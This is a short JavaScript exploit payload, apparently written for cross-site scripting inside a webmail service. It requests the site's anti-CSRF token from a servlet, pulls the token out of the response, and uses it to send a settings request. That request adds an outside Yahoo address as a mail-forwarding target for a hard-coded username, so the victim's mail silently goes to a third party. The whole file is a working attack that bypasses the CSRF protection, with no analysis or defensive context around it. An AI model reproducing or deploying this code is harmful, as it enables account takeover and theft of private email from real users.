
var tmp=""
var url_token='https://'+document.domain+'/mailService/JavaScriptServlet.do'
var httpRequest = new XMLHttpRequest();
httpRequest.open('POST',url_token,true);
httpRequest.send(null);
httpRequest.onreadystatechange = function ()
{
	if (httpRequest.readyState == 4 && httpRequest.status == 200)
		{
			tmp=httpRequest.responseText.split(":")[1];
			csrfadd(tmp);
		}
}


function csrfadd(rs){
var addmail="reqdemo%40yahoo.com";
//var uname=document.getElementsByClassName('wm-navbar-username')[0].innerText;
var uname="rory.chien";
var host=document.getElementsByClassName("msg-field-value")[0].innerText.split("@")[1].split(">")[0];
var u1=document.baseURI.match((/^(?:[^\/]|\/\/)*/))[0]+'/mailService/mail/M_set_1_10.do?user_name='+uname+'&host_name=';
var u2=host+"&forward_content="+addmail+"%0D%0A&add_new_forward_address="+addmail+"&owaspcsrftkn="+rs;
var u3=u1+u2;
var h = new XMLHttpRequest();
    h.open('GET',u3, true);
    h.send(null);
}
